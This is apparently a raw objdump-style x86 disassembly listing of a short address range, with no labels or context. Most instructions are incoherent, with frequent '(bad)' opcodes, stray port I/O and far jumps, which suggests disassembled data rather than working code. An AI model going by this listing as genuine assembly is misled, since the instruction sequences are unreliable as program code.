  40b720:	in     al,dx
  40b721:	scas   al,BYTE PTR es:[edi]
  40b722:	dec    esp
  40b723:	xor    bh,cl
  40b725:	pop    ss
  40b726:	jo     0x40b735
  40b728:	out    dx,eax
  40b729:	jae    0x40b76e
  40b72b:	dec    ebp
  40b72c:	push   edi
  40b72d:	cwde   
  40b72e:	push   cs
  40b72f:	pop    ecx
  40b730:	sbb    ch,bl
  40b732:	and    bl,BYTE PTR [eax-0x4d]
  40b735:	add    DWORD PTR [ebp+0x3a5d9051],ecx
  40b73b:	pushf  
  40b73c:	add    bl,BYTE PTR ds:0x6b5d83f6
  40b742:	cdq    
  40b743:	push   0xaec0d876
  40b748:	nop
  40b749:	es out dx,eax
  40b74b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b74c:	push   eax
  40b74d:	pushf  
  40b74e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b74f:	dec    ebp
  40b750:	xlat   BYTE PTR ds:[ebx]
  40b751:	jnp    0x40b7ab
  40b753:	test   al,0x47
  40b755:	ja     0x40b76b
  40b757:	fdivrp st(4),st
  40b759:	mov    ah,0xfa
  40b75b:	or     esp,DWORD PTR ds:[esi+0x30]
  40b75f:	dec    ebx
  40b760:	adc    edi,ecx
  40b762:	and    BYTE PTR [edx+0x50],0x82
  40b766:	inc    ecx
  40b767:	xchg   esp,eax
  40b768:	xchg   BYTE PTR [edx-0x33],cl
  40b76b:	std    
  40b76c:	inc    edi
  40b76d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b76e:	and    bh,bh
  40b770:	(bad)  
  40b771:	out    dx,eax
  40b772:	iret   
  40b773:	stc    
  40b774:	push   es
  40b775:	add    ah,0x58
  40b778:	adc    BYTE PTR [eax],dl
  40b77a:	adc    DWORD PTR [eax-0xb161baf],esi
  40b780:	dec    edi
  40b781:	ss out dx,eax
  40b783:	outs   dx,BYTE PTR ds:[esi]
  40b784:	or     al,0xca
  40b786:	xor    BYTE PTR ds:0xa300729c,dl
  40b78c:	jle    0x40b763
  40b78e:	pop    ebp
  40b78f:	sti    
  40b790:	cmp    ah,cl
  40b792:	push   0xffffff9f
  40b794:	xchg   esp,eax
  40b795:	mov    ah,0xa0
  40b798:	jbe    0x40b773
  40b79a:	sti    
  40b79b:	js     0x40b7cd
  40b79d:	loop   0x40b7fe
  40b79f:	jl     0x40b7cd
  40b7a1:	lods   eax,DWORD PTR ds:[esi]
  40b7a2:	(bad)  
  40b7a3:	or     eax,0xf2c84968
  40b7a8:	int    0xea
  40b7aa:	dec    esi
  40b7ab:	fdiv   QWORD PTR [edx+0x25]
  40b7ae:	dec    ebx
  40b7af:	popa   
  40b7b0:	or     bh,BYTE PTR [ebx+0x12bd771a]
  40b7b6:	inc    ecx
  40b7b7:	jg     0x40b739
  40b7b9:	fs daa 
  40b7bb:	xchg   ebx,eax
  40b7bc:	data16 ja 0x40b82b
  40b7bf:	(bad)  
  40b7c0:	sbb    BYTE PTR [edx],ah
  40b7c2:	mov    al,0x57
  40b7c4:	dec    ecx
  40b7c5:	gs push ecx
  40b7c7:	loop   0x40b80a
  40b7c9:	test   ebp,ebx
  40b7cb:	repnz fwait
  40b7cd:	mov    esi,0x5c199878
  40b7d2:	retf   0x5db
  40b7d5:	dec    eax
  40b7d6:	adc    DWORD PTR [esi+0x3cb490b5],edx
  40b7dc:	(bad)  
  40b7dd:	js     0x40b7ab
  40b7df:	gs sub al,0x18
  40b7e2:	aaa    
  40b7e3:	or     al,0xf3
  40b7e5:	sahf   
  40b7e6:	scas   eax,DWORD PTR es:[edi]
  40b7e7:	xlat   BYTE PTR ds:[ebx]
  40b7e8:	nop
  40b7e9:	jmp    0x40b7ab
  40b7eb:	pop    ebp
  40b7ec:	inc    esp
  40b7ed:	xor    al,0x7f
  40b7ef:	mov    edx,0xadc548b0
  40b7f4:	push   ebx
  40b7f5:	stc    
  40b7f6:	xchg   ecx,eax
  40b7f7:	dec    esp
  40b7f8:	std    
  40b7f9:	xchg   esp,eax
  40b7fa:	mov    BYTE PTR [ecx],dh
  40b7fc:	mov    edi,0xb2f59c14
  40b801:	push   ecx
  40b802:	mov    eax,DWORD PTR [edx+0x3814668f]
  40b808:	jne    0x40b7f9
  40b80a:	and    dl,BYTE PTR [edx-0x1c]
  40b80d:	(bad)  
  40b80e:	ficom  DWORD PTR [edi]
  40b810:	popa   
  40b811:	in     al,dx
  40b812:	mov    dh,BYTE PTR [ebp+edx*8+0x4e36bc80]
  40b819:	adc    bl,BYTE PTR [eax+ebx*1+0x79]
  40b81d:	inc    esp
  40b81e:	xchg   edx,eax
  40b81f:	mov    bl,BYTE PTR [edi]
  40b821:	sbb    BYTE PTR [ebp-0x39],bh
  40b824:	xor    eax,0x7d18cf2c
  40b829:	mov    esp,0xe5ea612d
  40b82e:	pop    edx
  40b82f:	std    
  40b830:	ficomp DWORD PTR [ebp-0x62]
  40b833:	clc    
  40b834:	stos   BYTE PTR es:[edi],al
  40b835:	push   edx
  40b836:	xchg   edx,eax
  40b837:	pop    esp
  40b838:	(bad)  
  40b839:	pop    edi
  40b83a:	xchg   ecx,eax
  40b83b:	pop    esp
  40b83c:	pop    ds
  40b83d:	push   ebp
  40b83e:	mov    ch,0xd9
  40b840:	and    DWORD PTR [esi],eax
  40b842:	test   cl,0xe1
  40b845:	fnstsw WORD PTR [edx]
  40b847:	sbb    edi,DWORD PTR [ebp*8+0x6a514163]
  40b84e:	sti    
  40b84f:	sahf   
  40b850:	and    ch,bh
  40b852:	or     eax,0xdf0e43fb
  40b857:	xchg   BYTE PTR [edx-0x5b],dh
  40b85a:	or     edx,ecx
  40b85c:	sbb    DWORD PTR [edx],0xffffffab
  40b85f:	ret    0xec1b
  40b862:	iret   
  40b863:	xchg   ebp,eax
  40b864:	dec    ebp
  40b865:	into   
  40b866:	mov    ss,ebp
  40b868:	sbb    BYTE PTR [eax-0x6c126a65],0xdf
  40b86f:	add    BYTE PTR ds:0xa94a0a09,bl
  40b875:	cld    
  40b876:	fucomip st,st(3)
  40b878:	pop    ebx
  40b879:	test   esp,eax
  40b87b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b87c:	mov    si,0x79cf
  40b880:	push   0x3da043fb
  40b885:	pop    ds
  40b886:	and    al,0x16
  40b888:	jne    0x40b900
  40b88a:	in     eax,dx
  40b88b:	and    al,0x9b
  40b88d:	xor    BYTE PTR [ecx-0x6b],cl
  40b890:	mov    BYTE PTR [esi],cl
  40b892:	or     BYTE PTR [edi+0x4ce1ea9a],ah
  40b898:	stc    
  40b899:	aas    
  40b89a:	les    esp,FWORD PTR [edx-0x29]
  40b89d:	jp     0x40b8b3
  40b89f:	stos   BYTE PTR es:[edi],al
  40b8a0:	aaa    
  40b8a1:	push   0xffffff87
  40b8a3:	mov    ebp,0x744604a4
  40b8a8:	loopne 0x40b868
  40b8aa:	sbb    DWORD PTR [esi+0x6f],edi
  40b8ad:	jae    0x40b870
  40b8af:	fs sbb al,0x4
  40b8b2:	shl    eax,cl
  40b8b4:	push   es
  40b8b5:	imul   ebp,ecx,0xbde6a30e
  40b8bb:	adc    DWORD PTR fs:0xf25452d9,ebp
  40b8c2:	in     eax,0xe
  40b8c4:	and    BYTE PTR [ecx+0x14],ch
  40b8c7:	stos   DWORD PTR es:[edi],eax
  40b8c8:	lods   eax,DWORD PTR cs:[esi]
  40b8ca:	cmp    al,0xa4
  40b8cc:	js     0x40b91b
  40b8ce:	dec    edx
  40b8cf:	mov    eax,ds:0x487980bc
  40b8d4:	(bad)  
  40b8d5:	sbb    al,0xd7
  40b8d7:	mov    ecx,0x28d2e9ed
  40b8dc:	mov    esi,0xdc6bccb9
  40b8e1:	push   es
  40b8e2:	cmp    eax,0x1e439c89
  40b8e7:	push   ebp
  40b8e8:	inc    edx
  40b8e9:	test   al,0xdc
  40b8eb:	pop    ebp
  40b8ec:	xor    DWORD PTR [ebx-0x34ed5368],ecx
  40b8f2:	mov    bh,0xf2
  40b8f4:	mov    cl,0x7e
  40b8f6:	and    bh,BYTE PTR [edx-0x25]
  40b8f9:	mov    esp,0xe506b670
  40b8fe:	fstp   DWORD PTR [eax+0x3b]
  40b901:	stc    
  40b902:	scas   eax,DWORD PTR es:[edi]
  40b903:	(bad)  
  40b904:	cmp    DWORD PTR [edi+0x32],edx
  40b907:	push   eax
  40b908:	cli    
  40b909:	sub    al,0xec
  40b90b:	mov    bl,0x0
  40b90d:	shl    DWORD PTR [edi-0x37],0x23
  40b911:	stos   DWORD PTR es:[edi],eax
  40b912:	xor    ebp,DWORD PTR [ebx]
  40b914:	adc    eax,0xd33cf754
  40b919:	mov    ch,BYTE PTR [ebx]
  40b91b:	dec    ebx
  40b91c:	enter  0xfc82,0x7e
  40b920:	js     0x40b982
  40b922:	jg     0x40b99f
  40b924:	dec    edx
  40b925:	ret    0xa4b
  40b928:	push   esi
  40b929:	pop    eax
  40b92a:	sbb    al,0x19
  40b92c:	mov    ebp,0x72a952e2
  40b931:	jl     0x40b8d1
  40b933:	(bad)  
  40b935:	add    eax,0x5c974626
  40b93a:	dec    edi
  40b93b:	inc    edx
  40b93c:	xchg   edi,eax
  40b93d:	xchg   edx,eax
  40b93e:	cld    
  40b93f:	dec    ebp
  40b940:	dec    ecx
  40b941:	mov    al,ds:0xb5bb9dea
  40b946:	ds pop edx
  40b948:	mov    ds:0x26e770e3,eax
  40b94d:	in     eax,0xbc
  40b94f:	mov    DWORD PTR [eax],ebx
  40b951:	ins    BYTE PTR es:[edi],dx
  40b952:	mul    bl
  40b954:	push   0x38
  40b956:	stos   BYTE PTR es:[edi],al
  40b957:	jb     0x40b9d8
  40b959:	fld    QWORD PTR [ebp-0x41]
  40b95c:	sbb    BYTE PTR [ecx+0x69],bl
  40b95f:	shr    DWORD PTR [ebp-0x50],1
  40b962:	mov    al,0xf
  40b964:	xor    al,0xb2
  40b966:	icebp  
  40b967:	or     DWORD PTR ds:0xf63df8a7,ebp
  40b96d:	leave  
  40b96e:	loopne 0x40b97b
  40b970:	jle    0x40b97d
  40b972:	mov    edx,0x63356589
  40b977:	jmp    0x424c:0x6ff95845
  40b97e:	sti    
  40b97f:	dec    ebp
  40b980:	push   edx
  40b981:	sbb    ecx,ecx
  40b983:	sbb    ch,0x13
  40b986:	loope  0x40b912
  40b988:	jnp    0x40b976
  40b98a:	(bad)
  40b98d:	cmp    BYTE PTR [edx+0xa71a6],bl
  40b993:	inc    esi
  40b994:	mov    al,ds:0x818deec2
  40b999:	cs and al,0x41
  40b99c:	stos   DWORD PTR es:[edi],eax
  40b99d:	leave  
  40b99e:	ins    BYTE PTR es:[edi],dx
  40b99f:	xor    al,0xa4
  40b9a1:	cld    
  40b9a2:	je     0x40b97f
  40b9a4:	loopne 0x40b956
  40b9a6:	cmp    DWORD PTR [edi+0x3a],0x3d
  40b9aa:	aaa    
  40b9ab:	ret    0x79f1
  40b9ae:	mov    al,0x4a
  40b9b0:	sub    dh,dh
  40b9b2:	popa   
  40b9b3:	jmp    0x37c1:0x4679c160
  40b9ba:	sub    eax,0x79
  40b9bd:	lea    ebx,[edi+edx*1]
  40b9c0:	stc    
  40b9c1:	jp     0x40b99c
  40b9c3:	jl     0x40b9ad
  40b9c5:	or     DWORD PTR [edi+ebp*2+0x41f8056],edi
  40b9cc:	popa   
  40b9cd:	add    bh,BYTE PTR [eax]
  40b9cf:	cld    
  40b9d0:	jge    0x40ba2a
  40b9d2:	popf   
  40b9d3:	aad    0x48
  40b9d5:	mov    DWORD PTR [edi-0x3bd4e1b4],ecx
  40b9db:	in     eax,0xd3
  40b9dd:	inc    ebx
  40b9de:	or     eax,DWORD PTR [edi+0x18]
  40b9e1:	push   esp
  40b9e2:	adc    al,0x11
  40b9e4:	fbld   TBYTE PTR [edi-0xa5ed119]
  40b9ea:	into   
  40b9eb:	adc    al,0xf9
  40b9ed:	ja     0x40ba43
  40b9ef:	sbb    eax,0xc4891b16
  40b9f4:	push   cs
  40b9f5:	ror    ebx,0x29
  40b9f8:	cmp    eax,0xc3f0fb03
  40b9fd:	xlat   BYTE PTR ds:[ebx]
  40b9fe:	outs   dx,DWORD PTR ds:[esi]
  40b9ff:	push   ebp
  40ba00:	or     ecx,edi
  40ba02:	add    BYTE PTR [ebx-0x40],bl
  40ba05:	arpl   sp,dx
  40ba07:	and    DWORD PTR ds:0xd56c029b,ebx
  40ba0d:	pop    edi
  40ba0e:	outs   dx,BYTE PTR ds:[esi]
  40ba0f:	xchg   DWORD PTR [ecx+eax*8+0x13],ecx
  40ba13:	fldln2 
  40ba15:	pop    ebp
  40ba16:	and    bl,BYTE PTR ds:0x79342b4e
  40ba1c:	lock (bad) 
  40ba1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba1f:	arpl   WORD PTR [ecx+0x41f9206a],si
  40ba25:	(bad)  
  40ba26:	adc    eax,0xcdf11075
  40ba2b:	shr    dh,cl
  40ba2d:	and    al,BYTE PTR [ecx]
  40ba2f:	sub    BYTE PTR [edi+0x2263d21d],bl
  40ba35:	cmc    
  40ba36:	xor    cl,BYTE PTR [esi]
  40ba38:	adc    BYTE PTR [ecx+0x60],dh
  40ba3b:	pop    ss
  40ba3c:	in     eax,dx
  40ba3d:	sbb    eax,0x3e88e38e
  40ba42:	retf   0x8407
  40ba45:	xchg   ebp,eax
  40ba46:	inc    edx
  40ba47:	lock jmp 0x40b9d9
  40ba4a:	into   
  40ba4b:	xor    ecx,DWORD PTR [edi-0x42662a37]
  40ba51:	mov    esi,0xc5135d11
  40ba56:	loopne 0x40ba37
  40ba58:	sti    
  40ba59:	fwait
  40ba5a:	mov    cl,0x82
  40ba5c:	gs pusha 
  40ba5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba5f:	sub    al,0x87
  40ba61:	sub    al,0x37
  40ba63:	xchg   edx,eax
  40ba64:	push   ss
  40ba65:	not    BYTE PTR [edx]
  40ba67:	sar    DWORD PTR [ebx+0x35],cl
  40ba6a:	sub    DWORD PTR [eax],eax
  40ba6c:	sub    ecx,DWORD PTR [ecx+0x341d2699]
  40ba72:	mov    ebx,0xa017adbc
  40ba77:	or     bh,BYTE PTR [ebp+0x3b40cdba]
  40ba7d:	mov    ?,WORD PTR [edi]
  40ba7f:	loop   0x40bacc
  40ba81:	fldcw  WORD PTR [esi+0x6f]
  40ba84:	mov    edi,0xf3919583
  40ba89:	call   FWORD PTR [eax-0x5dc73ad]
  40ba8f:	(bad)  
  40ba90:	cs xor eax,0xbd953e0c
  40ba96:	push   0x1df5f1f3
  40ba9b:	test   eax,eax
  40ba9d:	out    dx,eax
  40ba9e:	sbb    eax,0xb9929545
  40baa3:	adc    BYTE PTR [esi-0x5a],ch
  40baa6:	cs stc 
  40baa8:	or     DWORD PTR [ebx],esp
  40baaa:	sbb    ch,BYTE PTR [esi-0x1c]
  40baad:	int    0x6d
  40baaf:	inc    esi
  40bab0:	mov    al,ds:0xe9d2968
  40bab5:	cmp    BYTE PTR [edx-0x13],dl
  40bab8:	iret   
  40bab9:	pop    esi
  40baba:	inc    edx
  40babb:	cmp    eax,0x52b166c
  40bac1:	fs nop
  40bac3:	jae    0x40bb28
  40bac5:	test   edi,esp
  40bac7:	sub    esi,DWORD PTR [ecx-0x2a8afbb1]
  40bacd:	or     al,dl
  40bacf:	xchg   edx,eax
  40bad0:	outs   dx,DWORD PTR ds:[esi]
  40bad1:	inc    esp
  40bad2:	cmp    ebx,esp
  40bad4:	fwait
  40bad5:	mov    BYTE PTR [edx+0x60ff5b47],al
  40badb:	sbb    bh,BYTE PTR [ebx+0x4c]
  40bade:	arpl   WORD PTR [ecx],dx
  40bae0:	mov    bl,BYTE PTR [edi-0x7f811c0b]
  40bae6:	js     0x40bafe
  40bae8:	push   cs
  40bae9:	jbe    0x40bb64
  40baeb:	fidiv  DWORD PTR [eax-0x6cb33d06]
  40baf1:	mov    al,0x62
  40baf3:	jmp    0x40baf7
  40baf5:	xchg   DWORD PTR [ebx],ebp
  40baf7:	cli    
  40baf8:	les    eax,FWORD PTR [ebp-0x67]
  40bafb:	jg     0x40baa6
  40bafd:	cmp    eax,0xeadf03ee
  40bb02:	retf   
  40bb03:	outs   dx,BYTE PTR ds:[esi]
  40bb04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb05:	loopne 0x40bb3c
  40bb07:	lea    edx,[esi+0x75]
  40bb0a:	inc    esi
  40bb0b:	xor    al,0xa1
  40bb0d:	sbb    edi,DWORD PTR [ecx+0x1a558460]
  40bb13:	jecxz  0x40bb06
  40bb15:	mov    ds:0xb897b0ba,al
  40bb1a:	xchg   ebx,eax
  40bb1b:	jns    0x40bb06
  40bb1d:	mov    dh,0x22
  40bb1f:	std    
  40bb20:	push   esp
  40bb21:	ss into 
  40bb23:	iret   
  40bb24:	jo     0x40bb0f
  40bb26:	push   0x1e
  40bb28:	or     eax,0x7a07e8a2
  40bb2d:	inc    eax
  40bb2e:	shl    DWORD PTR [edx],0xe8
  40bb31:	out    dx,al
  40bb32:	cdq    
  40bb33:	jbe    0x40bab9
  40bb35:	in     al,0xe
  40bb37:	cmp    al,0x9e
  40bb39:	scas   al,BYTE PTR es:[edi]
  40bb3a:	(bad)  
  40bb3c:	mov    ecx,0x8ceb5730
  40bb41:	bound  ecx,QWORD PTR [ecx]
  40bb43:	in     eax,0xf9
  40bb45:	out    dx,eax
  40bb46:	mov    ds:0x9601b62d,eax
  40bb4b:	fmul   st(6),st
  40bb4d:	push   0xb0492c4
  40bb52:	pop    ecx
  40bb53:	lds    eax,FWORD PTR [ecx]
  40bb55:	cdq    
  40bb56:	jmp    0x9a1b:0x6f127835
  40bb5d:	(bad)  
  40bb5e:	rol    ebp,cl
  40bb60:	xor    al,0x43
  40bb62:	(bad)  
  40bb63:	js     0x40bbb5
  40bb65:	(bad)  
  40bb66:	xor    bl,BYTE PTR [edx+0x275c107d]
  40bb6c:	sbb    DWORD PTR [ecx],ecx
  40bb6e:	fs clc 
  40bb70:	add    eax,0x8823b0c4
  40bb75:	je     0x40bbb0
  40bb77:	ret    0xdcef
  40bb7a:	imul   ecx,DWORD PTR [edx],0x51
  40bb7d:	ret    
  40bb7e:	ds nop
  40bb80:	mov    eax,ds:0xda45e049
  40bb85:	out    0x7c,al
  40bb87:	gs sub esp,ebp
  40bb8a:	mov    eax,DWORD PTR [eax-0x6e]
  40bb8d:	daa    
  40bb8e:	popa   
  40bb8f:	push   esp
  40bb90:	push   ebp
  40bb91:	out    0xeb,eax
  40bb93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb94:	ds xor ah,cl
  40bb97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb98:	pushf  
  40bb99:	adc    ebp,ebp
  40bb9b:	aam    0x28
  40bb9d:	mov    ecx,DWORD PTR ds:0x520f8ebe
  40bba3:	jno    0x40bb2e
  40bba5:	xor    DWORD PTR [ebp+0x4d],eax
  40bba8:	das    
  40bba9:	adc    ah,BYTE PTR [edx-0x1a]
  40bbac:	idiv   BYTE PTR [ecx-0x80]
  40bbaf:	sti    
  40bbb0:	outs   dx,BYTE PTR ds:[esi]
  40bbb1:	push   es
  40bbb2:	dec    edx
  40bbb3:	inc    ebp
  40bbb4:	xchg   ebp,eax
  40bbb5:	outs   dx,BYTE PTR ds:[esi]
  40bbb6:	add    eax,0x394f5ffa
  40bbbb:	int3   
  40bbbc:	imul   esi,DWORD PTR ds:0xa821e30b,0xffffffa0
  40bbc3:	ss gs jmp 0x37f87649
  40bbca:	sti    
  40bbcb:	sbb    al,0xa1
  40bbcd:	test   ah,bh
  40bbcf:	mov    ah,0x66
  40bbd1:	(bad)  
  40bbd2:	shr    BYTE PTR [eax+0x54170b11],cl
  40bbd8:	jnp    0x40bb80
  40bbda:	fcom   DWORD PTR ds:0xdda44070
  40bbe0:	(bad)  
  40bbe1:	xor    bh,bl
  40bbe3:	shr    DWORD PTR [edx+0x10],1
  40bbe6:	rol    BYTE PTR [edi+0x5e58dd63],cl
  40bbec:	push   edx
  40bbed:	mov    edi,0x66158498
  40bbf2:	jo     0x40bc36
  40bbf4:	mov    al,ds:0x3d6a0603
  40bbf9:	adc    esp,DWORD PTR [ecx+eiz*2+0x7cf98b88]
  40bc00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc01:	ror    edx,0x1d
  40bc04:	mov    dl,0x8
  40bc06:	inc    ebp
  40bc07:	cmp    BYTE PTR [eax+eiz*1-0x59],al
  40bc0b:	int    0x73
  40bc0d:	inc    edx
  40bc0e:	fnsave [esi-0x624241c6]
  40bc14:	repz sub cl,BYTE PTR [esp+edi*4]
  40bc18:	cmp    al,0xde
  40bc1a:	cmp    al,0x88
  40bc1c:	repz imul esi,esi,0xe2124c84
  40bc23:	shr    DWORD PTR [edx],0xb5
  40bc26:	ror    BYTE PTR [esi-0x47],1
  40bc29:	jnp    0x40bc9e
  40bc2b:	add    DWORD PTR ds:0x447de57b,edx
  40bc31:	inc    edx
  40bc32:	jp     0x40bca6
  40bc34:	popf   
  40bc35:	push   ebp
  40bc36:	out    0x61,eax
  40bc38:	or     ch,BYTE PTR [eax+0x41d475a5]
  40bc3e:	pop    ebx
  40bc3f:	stos   BYTE PTR es:[edi],al
  40bc40:	xor    al,0x6d
  40bc42:	xchg   ebp,eax
  40bc43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc44:	ja     0x40bbf4
  40bc46:	data16 std 
  40bc48:	call   0x7b37:0xf5b54913
  40bc4f:	mov    ecx,0x61b9fbda
  40bc54:	inc    edi
  40bc55:	adc    DWORD PTR [esi],edx
  40bc57:	mov    ss,WORD PTR [ebx-0x76]
  40bc5a:	xchg   DWORD PTR [edi+0x434b40c3],eax
  40bc60:	into   
  40bc61:	mov    eax,ds:0x1b18d1a0
  40bc66:	or     eax,0xf19b9ba5
  40bc6b:	pop    edx
  40bc6c:	mov    ecx,0xe765162
  40bc71:	or     edi,DWORD PTR [eax+0x4a]
  40bc74:	(bad)  
  40bc75:	mov    WORD PTR [esi],?
  40bc77:	xor    ecx,DWORD PTR [ebp-0x64]
  40bc7a:	dec    ecx
  40bc7b:	cli    
  40bc7c:	pop    ecx
  40bc7d:	push   edx
  40bc7e:	repz mov eax,0x312292cb
  40bc84:	fwait
  40bc85:	call   0xea661ec1
  40bc8a:	(bad)  
  40bc8c:	fs js  0x40bc62
  40bc8f:	push   ebp
  40bc90:	mov    cs,edi
  40bc92:	jo     0x40bc69
  40bc94:	in     al,0xa6
  40bc96:	jo     0x40bc98
  40bc98:	sahf   
  40bc99:	mov    ch,0xe0
  40bc9b:	out    0xce,al
  40bc9d:	stos   DWORD PTR es:[edi],eax
  40bc9e:	pop    eax
  40bc9f:	fwait
  40bca0:	xchg   ebp,eax
  40bca1:	inc    ebx
  40bca2:	pop    esp
  40bca3:	dec    esi
  40bca5:	rcr    BYTE PTR [ebx+0x655752e6],1
  40bcab:	add    al,0xdf
  40bcad:	sahf   
  40bcae:	test   DWORD PTR [esi],eax
  40bcb0:	es clc 
  40bcb2:	imul   ebx
  40bcb4:	cs dec eax
  40bcb6:	les    eax,FWORD PTR [ecx+ebp*1]
  40bcb9:	and    ch,BYTE PTR [edx]
  40bcbb:	fld    TBYTE PTR [esi-0x43d83b1d]
  40bcc1:	sbb    al,0x46
  40bcc3:	mov    edx,cs
  40bcc5:	enter  0x4285,0xf1
  40bcc9:	mov    bl,0x8b
  40bccb:	xchg   edi,eax
  40bccc:	jp     0x40bcb0
  40bcce:	mov    ds:0x65f4c1a,eax
  40bcd3:	and    al,0xd5
  40bcd5:	(bad)  
  40bcd6:	push   ss
  40bcd7:	adc    ecx,esp
  40bcd9:	fbld   TBYTE PTR [ebx-0xb]
  40bcdc:	dec    ebx
  40bcdd:	xchg   edx,eax
  40bcde:	mov    eax,ds:0xa5ae5c77
  40bce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bce4:	pop    ecx
  40bce5:	shl    DWORD PTR [ebx+0xd10412b],0xbe
  40bcec:	ret    0xbfd5
  40bcef:	cmp    ecx,DWORD PTR [edx+0x35]
  40bcf2:	hlt    
  40bcf3:	pop    esi
  40bcf4:	cmp    ch,BYTE PTR [ebx]
  40bcf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcf7:	mov    edx,0x931d49fc
  40bcfc:	mov    ebx,0x2bd78dc2
  40bd01:	mov    eax,0xf46061c7
  40bd06:	xchg   ch,al
  40bd08:	jmp    0x3dea:0xe94e9579
  40bd0f:	aam    0x82
  40bd11:	xchg   edi,eax
  40bd12:	sub    DWORD PTR [eax-0x1c],ebp
  40bd15:	jae    0x40bcaa
  40bd17:	xor    DWORD PTR [ecx],edi
  40bd19:	lds    ecx,FWORD PTR [edx]
  40bd1b:	loope  0x40bd17
  40bd1d:	jge    0x40bd88
  40bd1f:	cdq    
  40bd20:	mov    BYTE PTR [ebp+0x18],bh
  40bd23:	out    dx,eax
  40bd24:	imul   esi,DWORD PTR [edi-0x36],0xfa028505
  40bd2b:	push   esp
  40bd2c:	mov    eax,0x60b043b5
  40bd31:	mov    ds:0xe5745ca6,al
  40bd36:	repz scas eax,DWORD PTR es:[edi]
  40bd38:	fiadd  DWORD PTR [ecx-0x46]
  40bd3b:	pop    edi
  40bd3c:	xchg   ebp,eax
  40bd3d:	mov    ds:0x25f3ad44,al
  40bd42:	adc    al,BYTE PTR [edx+0x35]
  40bd45:	out    0xa,al
  40bd47:	icebp  
  40bd48:	aad    0x44
  40bd4a:	popa   
  40bd4b:	jl     0x40bdab
  40bd4d:	push   edx
  40bd4e:	out    dx,eax
  40bd4f:	ss jbe 0x40bda2
  40bd52:	push   ecx
  40bd53:	aas    
  40bd54:	xor    esp,ebp
  40bd56:	or     DWORD PTR [eax-0x638af9cf],0xe3141ad9
  40bd60:	pop    ss
  40bd61:	mov    BYTE PTR [eax+0x3a6ab70d],dh
  40bd67:	out    dx,al
  40bd68:	sub    eax,0x156e4a62
  40bd6d:	xlat   BYTE PTR ds:[ebx]
  40bd6e:	lods   al,BYTE PTR ds:[esi]
  40bd6f:	mov    eax,0x1f8f6a17
  40bd74:	pop    esi
  40bd75:	call   0xf1e9807
  40bd7a:	adc    al,0x22
  40bd7c:	and    al,0x4
  40bd7e:	retf   
  40bd7f:	pushf  
  40bd80:	mov    al,ds:0x2ae9bff3
  40bd85:	and    BYTE PTR [ebx],bh
  40bd87:	int3   
  40bd88:	xchg   edi,eax
  40bd89:	push   ebx
  40bd8a:	in     al,0xb5
  40bd8c:	dec    edi
  40bd8d:	or     cl,0x60
  40bd90:	push   edi
  40bd91:	stc    
  40bd92:	into   
  40bd93:	inc    edx
  40bd94:	lock pop edi
  40bd96:	dec    ebp
  40bd97:	xor    BYTE PTR ds:0xb917d4e4,cl
  40bd9e:	sar    BYTE PTR [ecx],1
  40bda0:	dec    esi
  40bda1:	sbb    BYTE PTR [ebp-0x183c4aba],0x52
  40bda8:	mov    eax,0x24a6198a
  40bdad:	cmp    DWORD PTR [edx],eax
  40bdaf:	cld    
  40bdb0:	xchg   esp,eax
  40bdb1:	add    eax,0x5cb8b4da
  40bdb6:	out    0xfe,al
  40bdb8:	rcr    DWORD PTR ds:0xe61a8d70,cl
  40bdbe:	dec    edi
  40bdbf:	fmul   DWORD PTR [edi+0x7d]
  40bdc2:	xor    DWORD PTR [edx-0x3b],0xffffffbb
  40bdc6:	shl    DWORD PTR [esp+eax*8-0x5bcf80c],1
  40bdcd:	addr16 (bad) 
  40bdcf:	mov    edi,0x92338cc3
  40bdd4:	mov    edi,0x1ab2b200
  40bdd9:	into   
  40bdda:	fld    QWORD PTR ds:0x2999c24c
  40bde0:	add    BYTE PTR [edi],bh
  40bde2:	sub    ecx,esp
  40bde4:	sub    DWORD PTR [esi+eiz*1],0xffffff93
  40bde8:	ror    DWORD PTR [eax+ecx*2],0x75
  40bdec:	stc    
  40bded:	popf   
  40bdee:	push   0x6
  40bdf0:	loopne 0x40bda6
  40bdf2:	sbb    BYTE PTR [ecx],ah
  40bdf4:	mov    edi,0xa7bde1e9
  40bdf9:	inc    ebp
  40bdfa:	loopne 0x40bdd7
  40bdfc:	jae    0x40be7d
  40bdfe:	dec    esp
  40bdff:	in     eax,0x4e
  40be01:	les    ebx,FWORD PTR cs:[eax]
  40be04:	js     0x40bd97
  40be06:	dec    ebx
  40be07:	in     eax,dx
  40be08:	sbb    al,0x39
  40be0a:	mov    ebp,0x3eb84215
  40be0f:	test   esi,ecx
  40be11:	pop    edi
  40be12:	xor    BYTE PTR [ecx+0x42],bh
  40be15:	xor    DWORD PTR [ecx-0x1d9c693e],eax
  40be1b:	mov    al,0x37
  40be1d:	in     al,0xdb
  40be1f:	push   eax
  40be20:	jecxz  0x40be25
  40be22:	es xchg ebp,eax
  40be24:	pop    edx
  40be25:	mov    eax,0x1a78725
  40be2a:	xor    ebp,DWORD PTR [eax-0x4ebdc5e4]
  40be30:	sub    al,0x96
  40be32:	inc    ebx
  40be33:	and    BYTE PTR [esi-0x5b],dh
  40be36:	out    dx,eax
  40be37:	xlat   BYTE PTR ds:[ebx]
  40be38:	lods   eax,DWORD PTR ds:[esi]
  40be39:	dec    ecx
  40be3a:	in     eax,0x98
  40be3c:	aam    0x2e
  40be3e:	jmp    0xe4a0:0x785920ac
  40be45:	lahf   
  40be46:	pop    ss
  40be47:	pop    ds
  40be48:	sar    al,0x2c
  40be4b:	lods   al,BYTE PTR ds:[esi]
  40be4c:	fwait
  40be4d:	or     dl,0xe6
  40be50:	adc    BYTE PTR [eax+0x60],ch
  40be53:	adc    ecx,DWORD PTR [ecx]
  40be55:	(bad)  
